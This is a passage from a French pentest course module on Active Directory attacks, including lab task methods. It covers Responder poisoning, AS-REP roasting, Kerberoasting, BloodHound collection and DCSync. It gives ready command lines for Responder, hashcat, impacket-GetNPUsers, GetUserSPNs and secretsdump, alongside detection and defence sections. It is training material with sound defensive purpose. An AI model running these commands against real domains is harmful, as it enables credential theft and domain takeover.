Surveiller les outils Impacket.
Désactiver/retirer les comptes inutiles.
```

---

# 13. Responder, NTLM et collecte de hashes

## 13.1. Rôle de Responder

Responder écoute sur le réseau et répond à certaines requêtes de résolution de noms comme :

```text
LLMNR
NBT-NS
mDNS
WPAD selon configuration
```

Si une machine cherche un nom inexistant, Responder peut se faire passer pour la ressource recherchée et capturer une tentative d’authentification NTLM.

---

## 13.2. Commande de base en lab

Identifier l’interface :

```bash
ip a
```

Lancer Responder :

```bash
sudo responder -I eth0
```

ou :

```bash
sudo responder -I eth1
```

selon le réseau du lab.

---

## 13.3. Ce que Responder peut capturer

```text
NetNTLMv1
NetNTLMv2
authentifications SMB
authentifications HTTP
requêtes WPAD
```

Le format capturé peut être cracké hors ligne selon le cas.

---

## 13.4. Cracking NetNTLMv2

Hashcat mode courant :

```text
5600 → NetNTLMv2
```

Commande :

```bash
hashcat -m 5600 hashes/netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## 13.5. Attention légale et opérationnelle

Responder est bruyant et peut perturber un réseau réel.

À ne lancer que :

```text
dans un lab
sur un segment autorisé
dans un exercice explicitement prévu
```

---

## 13.6. Défense contre Responder/LLMNR

```text
Désactiver LLMNR.
Désactiver NBT-NS si possible.
Configurer correctement DNS.
Activer SMB signing.
Limiter NTLM.
Surveiller les réponses LLMNR/NBT-NS suspectes.
Bloquer WPAD non maîtrisé.
```

---

# 14. Metasploit dans un contexte AD

## 14.1. Pourquoi Metasploit est listé

Metasploit peut être utilisé pour :

```text
scanner certains services
valider une exposition SMB/RPC
gérer des sessions
tester des modules en lab
faire de la post-exploitation autorisée
```

Dans ce module, les outils centraux restent plutôt :

```text
ldapsearch
Impacket
hashcat
BloodHound
Responder
```

Metasploit est complémentaire.

---

## 14.2. Exemple de scan SMB version

Dans `msfconsole` :

```text
use auxiliary/scanner/smb/smb_version
set RHOSTS <DC_IP>
run
```

---

## 14.3. Bon usage en lab

Toujours documenter :

```text
module utilisé
RHOSTS
options
résultat
impact
preuve
```

Éviter les modules destructifs ou non nécessaires.

---

# 15. Interprétation des résultats et priorisation

## 15.1. Tous les résultats ne se valent pas

Une énumération AD produit beaucoup de données. Il faut prioriser.

Criticité forte :

```text
compte sans pre-auth + mot de passe cracké
compte service Kerberoasté + mot de passe cracké
compte membre d’un groupe privilégié
droits DCSync
GenericAll sur utilisateur privilégié
WriteDACL sur groupe critique
mot de passe dans description/comment/adminDescription
SPN sur compte admin
```

Criticité moyenne :

```text
description trop bavarde
compte inactif mais activé
mot de passe jamais expiré
groupe mal nommé
partage lisible contenant scripts
```

Criticité faible :

```text
naming convention exposée
ancienne note non sensible
ordinateur obsolète sans preuve d’exploitation
```

---

## 15.2. Construire une chaîne d’attaque

Exemple de chaîne :

```text
LDAP enum → compte no-preauth → AS-REP hash → crack → auth LDAP
→ lecture comment → découverte compte service → Kerberoast
→ crack → BloodHound → DCSync rights → secretsdump
```

Le but d’un bon rapport est de montrer comment des erreurs faibles s’additionnent.

---

## 15.3. Preuves propres

Pour chaque découverte :

```text
commande exécutée
résultat réduit
compte concerné
attribut concerné
impact
condition requise
remédiation
```

Évite de coller des secrets complets dans ton rapport final si ce n’est pas nécessaire.

---

# 16. Détection et défense

## 16.1. AS-REP Roasting

Signaux possibles :

```text
requêtes AS-REQ pour comptes sans pre-auth
événements Kerberos 4768
pics inhabituels de demandes Kerberos
énumération LDAP préalable
```

Défense :

```text
activer pre-auth partout
mots de passe longs
surveillance des comptes avec DoesNotRequirePreAuth
```

---

## 16.2. Kerberoasting

Signaux possibles :

```text
multiples événements 4769
demandes TGS pour beaucoup de SPN
usage d’etype RC4
demandes inhabituelles depuis une workstation
```

Défense :

```text
mots de passe longs et uniques
gMSA
désactiver RC4 quand possible
auditer SPN
réduire privilèges des comptes de service
```

---

## 16.3. BloodHound-like enumeration

Signaux :

```text
nombreuses requêtes LDAP
requêtes sur ACLs
énumération de groupes et sessions
accès SMB/RPC inhabituel
```

Défense :

```text
LDAP signing/channel binding selon contexte
tiering model
réduction des droits de lecture sensibles
surveillance des patterns d’énumération
```

---

## 16.4. DCSync

Signaux :

```text
Event ID 4662 sur objets de domaine
requêtes de réplication depuis une machine non-DC
accès Directory Replication Service anormal
```

Défense :

```text
limiter droits de réplication
surveiller non-DC effectuant réplication
auditer ACL du domaine
protéger comptes privilégiés
```

---

## 16.5. Responder/NTLM

Signaux :

```text
réponses LLMNR/NBT-NS suspectes
authentifications NTLM vers machines non attendues
trafic WPAD anormal
```

Défense :

```text
désactiver LLMNR/NBT-NS
forcer SMB signing
réduire NTLM
surveiller empoisonnement réseau
```

---

# 17. Cheatsheet de commandes

## Identifier le DC

```bash
sudo nmap -Pn --open -p 53,88,135,139,389,445,464,593,636,3268,3269 <SUBNET>
```

## RootDSE

```bash
ldapsearch -x -H ldap://<IP> -s base -b "" defaultNamingContext namingContexts dnsHostName
```

## Users

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user))'   dn sAMAccountName userPrincipalName description
```

## Groups

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(objectClass=group)'   dn cn member description
```

## Computers

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(objectClass=computer)'   dn dNSHostName operatingSystem servicePrincipalName
```

## AS-REP roastable users

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'   dn sAMAccountName userPrincipalName description
```

## GetNPUsers

```bash
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <IP> -request -outputfile hashes/asrep.txt
```

## Crack AS-REP

```bash
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes/asrep.txt --show
```

## SPN users

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'   dn sAMAccountName servicePrincipalName description
```

## GetUserSPNs

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <IP> -request -outputfile hashes/tgs.txt
```

## Crack Kerberoast

```bash
hashcat -m 13100 hashes/tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes/tgs.txt --show
```

## BloodHound

```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>'   -d '<DOMAIN_FQDN>'   -ns <IP>   -dc <DC_HOSTNAME>   -c All   --zip
```

## DCSync

```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<IP>' -just-dc-user '<TARGET_USER>'
```

## Responder

```bash
sudo responder -I eth0
```

---

# 18. Méthode de résolution des tasks du module

## Task 0 — AS-REP Roasting

Mission :

```text
Identifier un compte sans Kerberos pre-auth.
Récupérer son AS-REP hash.
Cracker le hash.
S’authentifier avec le mot de passe.
Lire l’attribut comment du compte.
```

Méthode :

```text
1. Énumérer les utilisateurs.
2. Chercher DONT_REQ_PREAUTH.
3. Utiliser GetNPUsers.
4. Cracker avec hashcat -m 18200.
5. Refaire ldapsearch avec les credentials récupérés.
6. Lire l’attribut comment du compte cible.
```

Commandes utiles :

```bash
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <IP> -request -outputfile hashes/asrep.txt
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP> -D '<DOMAIN>\<TARGET>' -w '<CRACKED>' -b '<TARGET_DN>' -s base "(objectClass=user)" "*" "+"
```

---

## Task 1 — Kerberoasting

Mission probable :

```text
Identifier un compte avec SPN.
Demander un TGS.
Cracker le ticket.
Utiliser le compte obtenu pour lire une information ou progresser.
```

Méthode :

```text
1. Lister les comptes avec SPN.
2. Identifier les comptes de service.
3. GetUserSPNs -request.
4. Cracker avec Hashcat.
5. Valider les identifiants.
6. Inspecter LDAP/BloodHound pour l’impact.
```

---

## Task 2 — LDAP Enumeration and BloodHound

Mission probable :

```text
Collecter des données LDAP/AD.
Importer dans BloodHound.
Identifier un chemin ou une relation dangereuse.
```

Méthode :

```text
1. Résoudre DNS.
2. Collecter avec bloodhound-python.
3. Importer les JSON/ZIP.
4. Lancer les requêtes utiles.
5. Identifier l’objet ou chemin demandé.
```

---

## Task 3 — LDAP / adminDescription

Mission probable :

```text
Trouver une donnée sensible cachée dans adminDescription.
```

Méthode :

```text
1. Énumérer les objets utilisateurs/groupes.
2. Demander adminDescription explicitement.
3. Demander "*" "+" si nécessaire.
4. Chercher les attributs non visibles par défaut.
```

Commande générique :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<IP>   -D '<DOMAIN>\<USER>' -w '<PASSWORD>'   -b '<BASE_DN>'   '(|(objectClass=user)(objectClass=group))'   dn cn sAMAccountName adminDescription description info comment
```

---

## Task 4 — DCSync Attack

Mission probable :

```text
Identifier ou obtenir un compte avec droits DCSync.
Utiliser secretsdump.
Extraire la donnée demandée.
```

Méthode :

```text
1. Utiliser BloodHound pour identifier les droits DCSync.
2. Valider le compte.
3. Utiliser secretsdump de manière ciblée.
4. Extraire uniquement ce qui est demandé.
```

Commande ciblée :

```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<IP>' -just-dc-user '<TARGET_USER>'
```

---

# 19. Troubleshooting

## LDAP invalid credentials

Causes possibles :

```text
mauvais domaine
mauvais format utilisateur
mot de passe mal échappé
compte verrouillé
```

Tester :

```bash
-D '<DOMAIN>\<USER>'
-D '<USER>@<DOMAIN_FQDN>'
```

---

## LDAP server unavailable

Vérifier :

```bash
ping <IP>
nmap -p 389 <IP>
```

---

## Kerberos clock skew

Erreur :

```text
KRB_AP_ERR_SKEW
```

Correction :

```bash
sudo ntpdate -u <IP>
```

---

## BloodHound DNS error

Ajouter `/etc/hosts` :

```text
<IP> DC01.PENTESTLAB.local DC01 PENTESTLAB.local
```

Utiliser :

```bash
-ns <IP>
-dc DC01.PENTESTLAB.local
```

---

## Hashcat ne crack pas

Vérifier :

```text
bon mode hashcat
hash non cassé par rockyou
format du hash intact
wordlist décompressée
```

Rockyou :

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## secretsdump échoue

Causes possibles :

```text
pas de droits DCSync
mauvais credentials
DC inaccessible
SMB bloqué
problème DNS/Kerberos
```

Tester d’abord LDAP/SMB avec le compte.

---

# 20. Glossaire

## AD

Active Directory, annuaire Microsoft utilisé pour gérer identités, machines et permissions.

## DC

Domain Controller, serveur qui héberge AD DS.

## LDAP

Protocole d’accès à l’annuaire.

## Kerberos

Protocole d’authentification principal en domaine AD.

## NTLM

Ancien protocole d’authentification challenge-response Windows.

## TGT

Ticket Granting Ticket, ticket Kerberos initial.

## TGS

Ticket Granting Service, ticket Kerberos pour accéder à un service.

## SPN

Service Principal Name, nom unique d’un service Kerberos.

## AS-REP Roasting

Attaque consistant à récupérer un AS-REP pour un compte sans pré-authentification Kerberos et à le cracker hors ligne.

## Kerberoasting

Attaque consistant à demander un TGS pour un SPN et à cracker le ticket hors ligne.

## DCSync

Technique utilisant les droits de réplication AD pour demander les secrets du domaine comme un DC.

## BloodHound

Outil de modélisation des relations AD sous forme de graphe.

## Responder

Outil de capture/empoisonnement LLMNR/NBT-NS/mDNS en lab.

## Hashcat

Outil de cracking de hashes.

---

# 21. Checklist finale

Tu dois savoir faire et expliquer :

```text
[ ] Identifier un Domain Controller avec Nmap
[ ] Récupérer defaultNamingContext avec RootDSE
[ ] Énumérer utilisateurs, groupes, ordinateurs avec LDAP
[ ] Comprendre userAccountControl
[ ] Repérer DONT_REQ_PREAUTH
[ ] Expliquer AS-REP Roasting
[ ] Utiliser GetNPUsers dans un lab
[ ] Cracker un AS-REP avec Hashcat
[ ] Repérer les comptes avec SPN
[ ] Expliquer Kerberoasting
[ ] Utiliser GetUserSPNs dans un lab
[ ] Cracker un TGS avec Hashcat
[ ] Collecter avec BloodHound
[ ] Lire un chemin BloodHound
[ ] Inspecter adminDescription/comment/info
[ ] Comprendre DCSync
[ ] Utiliser secretsdump de manière ciblée dans un lab
[ ] Expliquer les défenses associées
```

---

# Conclusion

Ce module marque une étape importante : tu passes de la simple compréhension Active Directory à l’analyse offensive structurée.

Le principe clé à retenir :

```text
L’énumération est l’arme principale en Active Directory.
```

Un attaquant n’a pas besoin de “deviner” s’il peut lire LDAP, observer les SPN, inspecter les attributs, collecter les ACLs et analyser BloodHound.

Les attaques comme AS-REP Roasting, Kerberoasting et DCSync ne sont pas des techniques isolées. Elles s’inscrivent dans une chaîne :

```text
Reconnaissance → Énumération → Identification de mauvaise configuration
→ Abus d’identifiants → Élévation de privilèges → Accès aux secrets
```

Un bon défenseur doit donc savoir faire la même chose qu’un attaquant en lab, pour repérer les erreurs avant qu’elles ne soient exploitées.
